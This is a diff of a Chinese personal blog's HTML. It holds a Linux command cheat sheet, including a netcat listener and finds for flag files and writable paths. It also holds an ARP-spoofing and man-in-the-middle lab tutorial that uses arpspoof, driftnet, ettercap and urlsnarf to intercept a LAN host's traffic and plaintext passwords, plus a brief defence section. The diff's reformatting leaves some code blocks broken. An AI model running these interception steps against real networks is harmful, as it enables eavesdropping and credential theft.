 <h3 id="开放-关闭端口监听："><a href="#开放-关闭端口监听：" class="headerlink" title="开放/关闭端口监听："></a>开放/关闭端口监听：</h3><p>我用ncat进行监听，监听命令：<br><code>nc -l -p 8888 -vvv</code></p>
 <p>停止监听：<br><code>ctrl + c</code></p>
 <p>注意ctrl + z并不是停止，而是退出当前监听命令界面，仍然在执行监听</p>
-<h2 id="文件类命令"><a href="#文件类命令" class="headerlink" title="文件类命令"></a>文件类命令</h2><h3 id="进入目录"><a href="#进入目录" class="headerlink" title="进入目录"></a>进入目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home # into dir named home</span><br><span class="line">cd ../ # into superior dir</span><br><span class="line">cd - # into last dir which u are from</span><br></pre></td></tr></table></figure>
-
-<h3 id="创建-删除目录"><a href="#创建-删除目录" class="headerlink" title="创建/删除目录"></a>创建/删除目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ilove # make dir named ilove</span><br><span class="line">rm -rf ilove # delete dir named ilove</span><br></pre></td></tr></table></figure>
-
-<h3 id="显示当前路径"><a href="#显示当前路径" class="headerlink" title="显示当前路径"></a>显示当前路径</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure>
-
-<h3 id="复制目录"><a href="#复制目录" class="headerlink" title="复制目录"></a>复制目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -a /root/ilove/ifuck /root # 第一个为原目录地址，第二个为新目录父级目录地址</span><br></pre></td></tr></table></figure>
-
-<p><strong>原目录地址必须为绝对路径</strong></p>
-<h3 id="新建-打开-删除文件"><a href="#新建-打开-删除文件" class="headerlink" title="新建/打开/删除文件"></a>新建/打开/删除文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi filename # 创建了一个叫filename的文件了，如果存在就打开了。</span><br></pre></td></tr></table></figure>
-
-<p>进入插入模式，按一下字母「i」就可以进入「插入模式（Insert mode）」，这时候你就可以开始输入文字了。</p>
+<h2 id="文件类命令"><a href="#文件类命令" class="headerlink" title="文件类命令"></a>文件类命令</h2><h3 id="进入目录"><a href="#进入目录" class="headerlink" title="进入目录"></a>进入目录</h3><pre><code>cd /home # into dir named home
+cd ../ # into superior dir
+cd - # into last dir which u are from </code></pre><h3 id="创建-删除目录"><a href="#创建-删除目录" class="headerlink" title="创建/删除目录"></a>创建/删除目录</h3><pre><code>mkdir ilove # make dir named ilove
+rm -rf ilove # delete dir named ilove</code></pre><h3 id="显示当前路径"><a href="#显示当前路径" class="headerlink" title="显示当前路径"></a>显示当前路径</h3><pre><code>pwd</code></pre><h3 id="复制目录"><a href="#复制目录" class="headerlink" title="复制目录"></a>复制目录</h3><pre><code>cp -a /root/ilove/ifuck /root # 第一个为原目录地址，第二个为新目录父级目录地址</code></pre><p><strong>原目录地址必须为绝对路径</strong></p>
+<h3 id="新建-打开-删除文件"><a href="#新建-打开-删除文件" class="headerlink" title="新建/打开/删除文件"></a>新建/打开/删除文件</h3><pre><code>vi filename # 创建了一个叫filename的文件了，如果存在就打开了。</code></pre><p>进入插入模式，按一下字母「i」就可以进入「插入模式（Insert mode）」，这时候你就可以开始输入文字了。</p>
 <p>当处于vi编辑模式时，想要退出的话按esc后输入冒号然后再输入wq，就能退出并保存。<br>linux 不区分文本和二进制，不需要文件名有txt。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f filename # 删除文件</span><br></pre></td></tr></table></figure>
-
-<p><strong>vi</strong>的基本操作</p>
+<pre><code>rm -f filename # 删除文件</code></pre><p><strong>vi</strong>的基本操作</p>
 <table>
 <thead>
 <tr>
@@ -406,9 +338,7 @@
 <td>保存当前修改并退出vi</td>
 </tr>
 </tbody></table>
-<h3 id="查看当前文件内容"><a href="#查看当前文件内容" class="headerlink" title="查看当前文件内容"></a>查看当前文件内容</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/ilove/filename # 查看相应目录的文件内容</span><br></pre></td></tr></table></figure>
-
-<h2 id="查询类相关命令"><a href="#查询类相关命令" class="headerlink" title="查询类相关命令"></a>查询类相关命令</h2><h3 id="find语句的用法"><a href="#find语句的用法" class="headerlink" title="find语句的用法"></a>find语句的用法</h3><table>
+<h3 id="查看当前文件内容"><a href="#查看当前文件内容" class="headerlink" title="查看当前文件内容"></a>查看当前文件内容</h3><pre><code>cat /root/ilove/filename # 查看相应目录的文件内容</code></pre><h2 id="查询类相关命令"><a href="#查询类相关命令" class="headerlink" title="查询类相关命令"></a>查询类相关命令</h2><h3 id="find语句的用法"><a href="#find语句的用法" class="headerlink" title="find语句的用法"></a>find语句的用法</h3><table>
 <thead>
 <tr>
 <th>语句</th>
@@ -453,15 +383,7 @@
 </tr>
 </tbody></table>
 <p>前几天做题py到了一个很牛逼的查询flag的find用法，先看一下语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -iname &quot;flag*&quot; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<h3 id="寻找可写目录"><a href="#寻找可写目录" class="headerlink" title="寻找可写目录"></a>寻找可写目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type d -writable 2&gt;/dev/null | grep -v -P &apos;(^/proc)|(^/dev)&apos;</span><br></pre></td></tr></table></figure>
-
-<h3 id="寻找可写文件"><a href="#寻找可写文件" class="headerlink" title="寻找可写文件"></a>寻找可写文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -writable 2&gt;/dev/null | grep -v -P &apos;(^/proc)|(^/dev)&apos;</span><br></pre></td></tr></table></figure>
-
-<h3 id="寻找最近20分钟内修改的文件"><a href="#寻找最近20分钟内修改的文件" class="headerlink" title="寻找最近20分钟内修改的文件"></a>寻找最近20分钟内修改的文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /var/www/html -mmin -20 -type f -print</span><br></pre></td></tr></table></figure>
-
-<h3 id="补一下相关知识"><a href="#补一下相关知识" class="headerlink" title="补一下相关知识"></a>补一下相关知识</h3><p><strong>/dev/null</strong><br>在类Unix系统中，/dev/null，或称空设备，是一个特殊的设备文件，它丢弃一切写入其中的数据（但报告写入操作成功），读取它则会立即得到一个EOF[1]。在程序员行话，尤其是Unix行话中，/dev/null被称为比特桶[2]或者黑洞。</p>
+<pre><code>find / -iname &quot;flag*&quot; 2&gt;/dev/null </code></pre><h3 id="寻找可写目录"><a href="#寻找可写目录" class="headerlink" title="寻找可写目录"></a>寻找可写目录</h3><pre><code>find / -type d -writable 2&gt;/dev/null | grep -v -P &#39;(^/proc)|(^/dev)&#39;</code></pre><h3 id="寻找可写文件"><a href="#寻找可写文件" class="headerlink" title="寻找可写文件"></a>寻找可写文件</h3><pre><code>find / -type f -writable 2&gt;/dev/null | grep -v -P &#39;(^/proc)|(^/dev)&#39;</code></pre><h3 id="寻找最近20分钟内修改的文件"><a href="#寻找最近20分钟内修改的文件" class="headerlink" title="寻找最近20分钟内修改的文件"></a>寻找最近20分钟内修改的文件</h3><pre><code>find /var/www/html -mmin -20 -type f -print</code></pre><h3 id="补一下相关知识"><a href="#补一下相关知识" class="headerlink" title="补一下相关知识"></a>补一下相关知识</h3><p><strong>/dev/null</strong><br>在类Unix系统中，/dev/null，或称空设备，是一个特殊的设备文件，它丢弃一切写入其中的数据（但报告写入操作成功），读取它则会立即得到一个EOF[1]。在程序员行话，尤其是Unix行话中，/dev/null被称为比特桶[2]或者黑洞。</p>
 <p><strong>数据流重定向</strong><br>操作符 | 解析<br>—— | —-<br>1&gt; | 以覆盖的方法将“正确的数据”输出到指定的文件或设备上<br>1&gt;&gt; | 以累加的方法将“正确的数据”输出到指定的文件或设备上<br>2&gt; | 以覆盖的方法将“错误的数据”输出到指定的文件或设备上；<br>2&gt;&gt; | 以累加的方法将“错误的数据”输出到指定的文件或设备上；</p>
 <p>所以这句话的意思就是搜索所有文件名包含flag字段的文件，并把错误的搜索项以覆盖的方式丢弃到/dev/null</p>
 <h3 id="文本内容查找"><a href="#文本内容查找" class="headerlink" title="文本内容查找"></a>文本内容查找</h3><table>
@@ -497,25 +419,16 @@
 </tr>
 </tbody></table>
 <h2 id="权限类相关"><a href="#权限类相关" class="headerlink" title="权限类相关"></a>权限类相关</h2><h3 id="修改上传目录权限"><a href="#修改上传目录权限" class="headerlink" title="修改上传目录权限"></a>修改上传目录权限</h3><p>linux 修改某目录下所有所有子目录权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R 777 html</span><br></pre></td></tr></table></figure>
+<pre><code>chmod -R 777 html</code></pre><p>修改某目录为任何用户都用写读执行权限</p>
+<pre><code>chmod a+rwx html</code></pre><h3 id="显示进程"><a href="#显示进程" class="headerlink" title="显示进程"></a>显示进程</h3><pre><code>ps -ef # 列出所有进程信息，包括pid</code></pre><h3 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h3><pre><code>kill [option] pid</code></pre><p>选项 -9 会强行终止进程</p>
+<h2 id="系统相关"><a href="#系统相关" class="headerlink" title="系统相关"></a>系统相关</h2><h3 id="关机-重启"><a href="#关机-重启" class="headerlink" title="关机/重启"></a>关机/重启</h3><pre><code>shutdown -h now # 关机
+shutdown -r now # 重启</code></pre><h3 id="查看Ip"><a href="#查看Ip" class="headerlink" title="查看Ip"></a>查看Ip</h3><pre><code>ifconfig</code></pre><h3 id="查看参考手册（例如arpspoof-命令）"><a href="#查看参考手册（例如arpspoof-命令）" class="headerlink" title="查看参考手册（例如arpspoof 命令）"></a>查看参考手册（例如arpspoof 命令）</h3><pre><code>man arpspoof</code></pre><h3 id="linux中的-amp-amp-和-amp-，-和"><a href="#linux中的-amp-amp-和-amp-，-和" class="headerlink" title="linux中的&amp;&amp;和&amp;，|和||"></a>linux中的&amp;&amp;和&amp;，|和||</h3><pre><code>&amp;  表示任务在后台执行，如要在后台运行redis-server,则有  redis-server &amp;
 
-<p>修改某目录为任何用户都用写读执行权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a+rwx html</span><br></pre></td></tr></table></figure>
+&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令 ，如 echo &#39;1‘ &amp;&amp; echo &#39;2&#39;    
 
-<h3 id="显示进程"><a href="#显示进程" class="headerlink" title="显示进程"></a>显示进程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef # 列出所有进程信息，包括pid</span><br></pre></td></tr></table></figure>
+| 表示管道，上一条命令的输出，作为下一条命令参数，如 echo &#39;yes&#39; | wc -l
 
-<h3 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill [option] pid</span><br></pre></td></tr></table></figure>
-
-<p>选项 -9 会强行终止进程</p>
-<h2 id="系统相关"><a href="#系统相关" class="headerlink" title="系统相关"></a>系统相关</h2><h3 id="关机-重启"><a href="#关机-重启" class="headerlink" title="关机/重启"></a>关机/重启</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shutdown -h now # 关机</span><br><span class="line">shutdown -r now # 重启</span><br></pre></td></tr></table></figure>
-
-<h3 id="查看Ip"><a href="#查看Ip" class="headerlink" title="查看Ip"></a>查看Ip</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
-
-<h3 id="查看参考手册（例如arpspoof-命令）"><a href="#查看参考手册（例如arpspoof-命令）" class="headerlink" title="查看参考手册（例如arpspoof 命令）"></a>查看参考手册（例如arpspoof 命令）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man arpspoof</span><br></pre></td></tr></table></figure>
-
-<h3 id="linux中的-amp-amp-和-amp-，-和"><a href="#linux中的-amp-amp-和-amp-，-和" class="headerlink" title="linux中的&amp;&amp;和&amp;，|和||"></a>linux中的&amp;&amp;和&amp;，|和||</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&amp;  表示任务在后台执行，如要在后台运行redis-server,则有  redis-server &amp;</span><br><span class="line"></span><br><span class="line">&amp;&amp; 表示前一条命令执行成功时，才执行后一条命令 ，如 echo &apos;1‘ &amp;&amp; echo &apos;2&apos;    </span><br><span class="line"></span><br><span class="line">| 表示管道，上一条命令的输出，作为下一条命令参数，如 echo &apos;yes&apos; | wc -l</span><br><span class="line"></span><br><span class="line">|| 表示上一条命令执行失败后，才执行下一条命令，如 cat nofile || echo &quot;fail&quot;</span><br></pre></td></tr></table></figure>
-
-<hr>
+|| 表示上一条命令执行失败后，才执行下一条命令，如 cat nofile || echo &quot;fail&quot;</code></pre><hr>
 <h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>目前接触到的有这些，还有很多命令没接触到，日后一并记录到此。已知的，chomd目前还没有记载</p>
 <h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://www.jianshu.com/p/f468e02f38a0" target="_blank" rel="noopener">linux添加用户，用户组（centos7）</a><br><a href="https://blog.csdn.net/o0DarkNessYY0o/article/details/52072054" target="_blank" rel="noopener">【Linux】CentOS7 常用命令集合</a></p>
 
@@ -523,7 +436,7 @@
             </div>
             <div class="continue">
             <a href="/2018/07/23/linux基本使用/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -590,61 +503,64 @@
 <li>用nmap查看当前网端的活跃主机</li>
 </ol>
 <p><strong>nmap命令</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sF 192.168.11.0/24</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://p3.ssl.qhimg.com/t01160b3ef83d34572e.jpg" alt><br>得到如图活跃主机，可以看到我们的主机B。当然获取Ip的途径不可能这么简单，你也可以用fping的方法来分析，之前我用fping探测局域网windows10的主机，发现Ping不通，win10防火墙还是有点东西。不过你可以根据fping的发送包来推断主机是否真正存活，具体可以google一下fping的用法，这里给推荐一个链接</p>
+<pre><code>nmap -sF 192.168.11.0/24</code></pre><p><img src="https://p3.ssl.qhimg.com/t01160b3ef83d34572e.jpg" alt><br>得到如图活跃主机，可以看到我们的主机B。当然获取Ip的途径不可能这么简单，你也可以用fping的方法来分析，之前我用fping探测局域网windows10的主机，发现Ping不通，win10防火墙还是有点东西。不过你可以根据fping的发送包来推断主机是否真正存活，具体可以google一下fping的用法，这里给推荐一个链接</p>
 <p><a href="https://www.cnblogs.com/dunitian/p/5074783.html" target="_blank" rel="noopener">Kali信息收集：Fping</a></p>
 <ol start="3">
 <li>检查被攻击主机是否可以正常上网<br><img src="https://p4.ssl.qhimg.com/t010225c59bde160166.png" alt><br>百度正常访问</li>
 </ol>
 <ol start="4">
-<li>利用Arpspoof进行欺骗攻击<br>Kali自带的Arpspoof可以很好的进行欺骗，man arpspoof查看官网手册（网上翻译）：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">名字 </span><br><span class="line">    arpspoof # 截获交换局域网中的数据包</span><br><span class="line"></span><br><span class="line">用法</span><br><span class="line">    arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</span><br><span class="line"></span><br><span class="line">描述</span><br><span class="line">    # arpspoof通过伪造的ARP响应包改变局域网中从目标主机（或所有主机）到另一个主机（host）的数据包转发路径。这是交换局域网中嗅探网络流量的一种极为有效的方法。内核IP转发（或如fragrouter这样的、用户层面的、能完成同样功能的软件）必须提前开启。</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">    -i interface</span><br><span class="line">        # 指定要使用的接口（即指定一块网卡）</span><br><span class="line"></span><br><span class="line">    -c own|host|both</span><br><span class="line">        # 指定在恢复ARP配置时使用的硬件地址；当在清理（cleaning up）时，数据包的源地址可以用自己的也可以用主机（host）的硬件地址。使用伪造的硬件地址可能导致某些配置下的交换网络、AP网络或桥接网络通信中断，然而它比起默认值————使用自己的硬件地址要工作地更为可靠。</span><br><span class="line"></span><br><span class="line">    -t target</span><br><span class="line">        # 指定一个特殊的、将被ARP毒化的主机（如果没有指定，则认为是局域网中所有主机）。重复可以指定多个主机。</span><br><span class="line"></span><br><span class="line">    -r  </span><br><span class="line">        # 毒化两个主机（目标和主机（host））以捕获两个方向的网络流量。（仅仅在和-t参数一起使用时有效）</span><br><span class="line"></span><br><span class="line">    host   #你想要截获数据包的主机 (通常是网关)。</span><br></pre></td></tr></table></figure>
-
-
-</li>
+<li>利用Arpspoof进行欺骗攻击<br>Kali自带的Arpspoof可以很好的进行欺骗，man arpspoof查看官网手册（网上翻译）：<pre><code>名字 
+ arpspoof # 截获交换局域网中的数据包
+</code></pre></li>
 </ol>
-<ol start="5">
-<li>作为网关欺骗<br>命令语句<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.11.105 192.168.1.1</span><br></pre></td></tr></table></figure>
+<p>用法<br>    arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</p>
+<p>描述<br>    # arpspoof通过伪造的ARP响应包改变局域网中从目标主机（或所有主机）到另一个主机（host）的数据包转发路径。这是交换局域网中嗅探网络流量的一种极为有效的方法。内核IP转发（或如fragrouter这样的、用户层面的、能完成同样功能的软件）必须提前开启。</p>
+<p>参数<br>    -i interface<br>        # 指定要使用的接口（即指定一块网卡）<br><br>    -c own|host|both<br>        # 指定在恢复ARP配置时使用的硬件地址；当在清理（cleaning up）时，数据包的源地址可以用自己的也可以用主机（host）的硬件地址。使用伪造的硬件地址可能导致某些配置下的交换网络、AP网络或桥接网络通信中断，然而它比起默认值————使用自己的硬件地址要工作地更为可靠。<br><br>    -t target<br>        # 指定一个特殊的、将被ARP毒化的主机（如果没有指定，则认为是局域网中所有主机）。重复可以指定多个主机。<br><br>    -r<br>        # 毒化两个主机（目标和主机（host））以捕获两个方向的网络流量。（仅仅在和-t参数一起使用时有效）<br><br>    host   #你想要截获数据包的主机 (通常是网关)。</p>
+<pre><code>
+5. 作为网关欺骗
+命令语句</code></pre><p>arpspoof -i eth0 -t 192.168.11.105 192.168.1.1</p>
+<pre><code>![](https://p3.ssl.qhimg.com/t01364b901401aae698.jpg)
+执行命令，Kali会向主机B发送ARP响应包，响应包的内容是Kali的ip-mac地址，而响应包里的ip则是网关主机ip地址。每一行代表一个响应包。从左到右：自己Kali的mac、主机B的mac、帧类型码(0806，代表ARP包)、包大小、包内容。
 
-</li>
-</ol>
-<p><img src="https://p3.ssl.qhimg.com/t01364b901401aae698.jpg" alt><br>执行命令，Kali会向主机B发送ARP响应包，响应包的内容是Kali的ip-mac地址，而响应包里的ip则是网关主机ip地址。每一行代表一个响应包。从左到右：自己Kali的mac、主机B的mac、帧类型码(0806，代表ARP包)、包大小、包内容。</p>
-<ol start="6">
-<li>被攻击主机B网络中断<br><img src="https://p1.ssl.qhimg.com/t0178e6ea7a6cacc21f.png" alt><br>在kali终端输入control + c 可以停止，然后主机重新恢复正常联网状态</li>
-</ol>
-<h2 id="基于Arp攻击理解下的MITM"><a href="#基于Arp攻击理解下的MITM" class="headerlink" title="基于Arp攻击理解下的MITM"></a>基于Arp攻击理解下的MITM</h2><p>在前面Arp成功进行攻击后，我们开始作为中间人进行欺骗，需要设置ip转发，获取目标主机B的流量，其后配合其它工具(drifnet)等进行进一步嗅探。</p>
-<p>值得一提的是，我们的Arp攻击也是欺骗，但它是单向欺骗，冒充网关主机来欺骗目标主机。实际中，中间人攻击一般是双向欺骗。即作为中间人，主机A双向欺骗主机B与C获得通信内容，但是不破坏通信数据的传输。为了不影响B与C传输的数据丢失，主机A开启ip转发，开启后来自B主机的数据包经过A主机的Kali后转发给主机C。欺骗两个主机B和C后，我们就能嗅探到双向数据包。</p>
-<p>如果你的kali在虚拟机，那么以下步骤均需要一个外置的usb无线网卡。在虚拟机中，网络的连接比较复杂，而Ip转发很大程度上取决于网卡性能。如果你是在虚拟机中Kali进行转发，基本都会失败，因为笔记本的内置无限网卡满足不了需求。由于放假在家我的usb无线网卡落在了寝室..下面仅以文字给大家介绍攻击的思路和流程，还请见谅…….</p>
-<h3 id="linux的ip转发"><a href="#linux的ip转发" class="headerlink" title="linux的ip转发"></a>linux的ip转发</h3><p>linux因为系统安全，是不支持IP转发的，其配置文件写在/proc/sys/net/ipv4的ip_forward中。默认为0，需要修改为1。</p>
-<p>开启方法大致有两种：</p>
-<ol>
-<li><p>只接进入文件修改</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /proc/sys/net/ipv4</span><br><span class="line">ls</span><br><span class="line">cat ip_forward</span><br><span class="line">#显示结果为0</span><br><span class="line">echo 1 &gt; ip_forward</span><br><span class="line">cat ip_forward</span><br><span class="line">#显示结果为1，修改成功</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>使用echo</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># echo  &quot;1&quot;&gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
+6. 被攻击主机B网络中断
+![](https://p1.ssl.qhimg.com/t0178e6ea7a6cacc21f.png)
+在kali终端输入control + c 可以停止，然后主机重新恢复正常联网状态
 
-</li>
-</ol>
-<h3 id="对网关和目标主机B的双向欺骗"><a href="#对网关和目标主机B的双向欺骗" class="headerlink" title="对网关和目标主机B的双向欺骗"></a>对网关和目标主机B的双向欺骗</h3><p>这里进行一步执行，选用第二种Ip转发手段<br>命令如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; arpspoof -i eth0 -t 192.168.11.105 -r 192.168.11.1</span><br></pre></td></tr></table></figure>
+## 基于Arp攻击理解下的MITM
+在前面Arp成功进行攻击后，我们开始作为中间人进行欺骗，需要设置ip转发，获取目标主机B的流量，其后配合其它工具(drifnet)等进行进一步嗅探。
 
-<h3 id="利用driftnet进程监控"><a href="#利用driftnet进程监控" class="headerlink" title="利用driftnet进程监控"></a>利用driftnet进程监控</h3><p>持续保持欺骗，再重新打开一个命令终端。<br>输入命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# driftnet -i eth0</span><br></pre></td></tr></table></figure>
+值得一提的是，我们的Arp攻击也是欺骗，但它是单向欺骗，冒充网关主机来欺骗目标主机。实际中，中间人攻击一般是双向欺骗。即作为中间人，主机A双向欺骗主机B与C获得通信内容，但是不破坏通信数据的传输。为了不影响B与C传输的数据丢失，主机A开启ip转发，开启后来自B主机的数据包经过A主机的Kali后转发给主机C。欺骗两个主机B和C后，我们就能嗅探到双向数据包。
 
-<p>跳出来的drift窗口即会显示本机正在浏览的图片</p>
-<h3 id="使用ettercap工具获取密码"><a href="#使用ettercap工具获取密码" class="headerlink" title="使用ettercap工具获取密码"></a>使用ettercap工具获取密码</h3><ol>
-<li>打开新的终端，输入 attercap -G 启动工具</li>
-<li>点击Sniff -&gt; unified sniffing，选择要抓包的网卡，默认是自己的网卡eth0，点确定</li>
-<li>然后单击Hosts -&gt; Scan for host，待扫描完成后再次Scan for host，此时可以看到ettercap-NG已经扫描的主机列表</li>
-<li>选择攻击目标，点击192.168.11.105的ip地址，点击Add to Target 1 ，然后选择网关的ip地址192.168.11.1，点击Add to Target 2</li>
-<li>明确目标攻击方式：点击Mitm -&gt; arp poisoning -&gt; Sniff remote connections -&gt; 确定</li>
-<li>开始监听：start -&gt; Start sniffing </li>
-</ol>
-<p>工具就会抓取主机B的数据包和主机C返回的数据包,分析http post请求可以判断账号密码信息。</p>
-<h3 id="urlsnarf：获得受害者的HTTP请求"><a href="#urlsnarf：获得受害者的HTTP请求" class="headerlink" title="urlsnarf：获得受害者的HTTP请求"></a>urlsnarf：获得受害者的HTTP请求</h3><p>输入命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# urlsnarf -i eth0</span><br></pre></td></tr></table></figure>
+如果你的kali在虚拟机，那么以下步骤均需要一个外置的usb无线网卡。在虚拟机中，网络的连接比较复杂，而Ip转发很大程度上取决于网卡性能。如果你是在虚拟机中Kali进行转发，基本都会失败，因为笔记本的内置无限网卡满足不了需求。由于放假在家我的usb无线网卡落在了寝室..下面仅以文字给大家介绍攻击的思路和流程，还请见谅.......
+### linux的ip转发
+linux因为系统安全，是不支持IP转发的，其配置文件写在/proc/sys/net/ipv4的ip_forward中。默认为0，需要修改为1。
 
+开启方法大致有两种：
+1. 只接进入文件修改</code></pre><p>cd /proc/sys/net/ipv4<br>ls<br>cat ip_forward</p>
+<p>#显示结果为0<br>echo 1 &gt; ip_forward<br>cat ip_forward</p>
+<p>#显示结果为1，修改成功</p>
+<pre><code>2. 使用echo</code></pre><h1 id="echo-“1”-gt-proc-sys-net-ipv4-ip-forward"><a href="#echo-“1”-gt-proc-sys-net-ipv4-ip-forward" class="headerlink" title="echo  “1”&gt; /proc/sys/net/ipv4/ip_forward"></a>echo  “1”&gt; /proc/sys/net/ipv4/ip_forward</h1><pre><code>
+### 对网关和目标主机B的双向欺骗
+这里进行一步执行，选用第二种Ip转发手段
+命令如下：</code></pre><p>root@kali:~# echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; arpspoof -i eth0 -t 192.168.11.105 -r 192.168.11.1</p>
+<pre><code>
+### 利用driftnet进程监控
+持续保持欺骗，再重新打开一个命令终端。
+输入命令：</code></pre><p>root@kali:~# driftnet -i eth0</p>
+<pre><code>跳出来的drift窗口即会显示本机正在浏览的图片
+
+### 使用ettercap工具获取密码
+1. 打开新的终端，输入 attercap -G 启动工具
+2. 点击Sniff -&gt; unified sniffing，选择要抓包的网卡，默认是自己的网卡eth0，点确定
+3. 然后单击Hosts -&gt; Scan for host，待扫描完成后再次Scan for host，此时可以看到ettercap-NG已经扫描的主机列表
+4. 选择攻击目标，点击192.168.11.105的ip地址，点击Add to Target 1 ，然后选择网关的ip地址192.168.11.1，点击Add to Target 2
+5. 明确目标攻击方式：点击Mitm -&gt; arp poisoning -&gt; Sniff remote connections -&gt; 确定
+6. 开始监听：start -&gt; Start sniffing 
+
+工具就会抓取主机B的数据包和主机C返回的数据包,分析http post请求可以判断账号密码信息。
+
+### urlsnarf：获得受害者的HTTP请求
+输入命令：</code></pre><p>root@kali:~# urlsnarf -i eth0<br>```</p>
 <h3 id="使用Wireshark抓包"><a href="#使用Wireshark抓包" class="headerlink" title="使用Wireshark抓包"></a>使用Wireshark抓包</h3><p>使用Wireshark抓取所有的数据包，过滤分析不同请求，类似于ettercap。<br>例如，要找HTTP POST请求，过滤，查看明文密码，一般是以POST形式上传的账号密码。</p>
 <h2 id="关于Arp欺骗的防御"><a href="#关于Arp欺骗的防御" class="headerlink" title="关于Arp欺骗的防御"></a>关于Arp欺骗的防御</h2><p><img src="https://p4.ssl.qhimg.com/t019370399a03c046c4.png" alt><br>防御原理很简单，就是不让攻击者肆意表明自己就是网关主机。我们进入网关主机（路由器后台地址），网络参数一栏一般有ip与mac绑定一栏，把网关的mac地址与网关地址绑定就好了。只要确定了对应关系，当攻击者发布arp相应包时，就不会更新相应的ip-mac缓存表。如果想知道对方主机的ip地址其实也容易。我们在Cmd下键入命令<code>arp -a</code>看一下相同mac，就找到了攻击者。</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
@@ -658,7 +574,7 @@
             </div>
             <div class="continue">
